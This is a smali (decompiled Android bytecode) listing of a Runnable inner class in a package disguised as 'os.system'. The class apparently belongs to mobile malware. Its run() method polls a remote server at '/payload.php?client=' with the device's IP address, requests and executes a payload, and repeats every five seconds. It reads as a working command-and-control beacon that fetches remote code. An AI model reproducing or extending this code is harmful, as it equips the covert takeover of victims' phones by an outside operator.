.class Los/system/System$2;
.super Ljava/lang/Object;
.source "System.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/System;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/System;


# direct methods
.method constructor <init>(Los/system/System;)V
    .locals 0

    .prologue
    .line 99
    iput-object p1, p0, Los/system/System$2;->this$0:Los/system/System;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .prologue
    .line 102
    iget-object v0, p0, Los/system/System$2;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-boolean v0, Los/system/ReceiverBoot;->pingResult:Z

    if-eqz v0, :cond_0

    .line 103
    iget-object v0, p0, Los/system/System$2;->this$0:Los/system/System;

    iget-object v1, p0, Los/system/System$2;->this$0:Los/system/System;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Los/system/System$2;->this$0:Los/system/System;

    invoke-static {v3}, Los/system/System;->access$300(Los/system/System;)Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?client="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 104
    iget-object v0, p0, Los/system/System$2;->this$0:Los/system/System;

    iget-object v1, p0, Los/system/System$2;->this$0:Los/system/System;

    invoke-virtual {v0, v1}, Los/system/System;->payload(Landroid/content/Context;)V

    .line 109
    :goto_0
    iget-object v0, p0, Los/system/System$2;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$600(Los/system/System;)Landroid/os/Handler;

    move-result-object v0

    iget-object v1, p0, Los/system/System$2;->this$0:Los/system/System;

    invoke-static {v1}, Los/system/System;->access$500(Los/system/System;)Ljava/lang/Runnable;

    move-result-object v1

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 110
    return-void

    .line 106
    :cond_0
    sget-object v0, Los/system/System;->TAG:Ljava/lang/String;

    const-string v1, "offline"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method
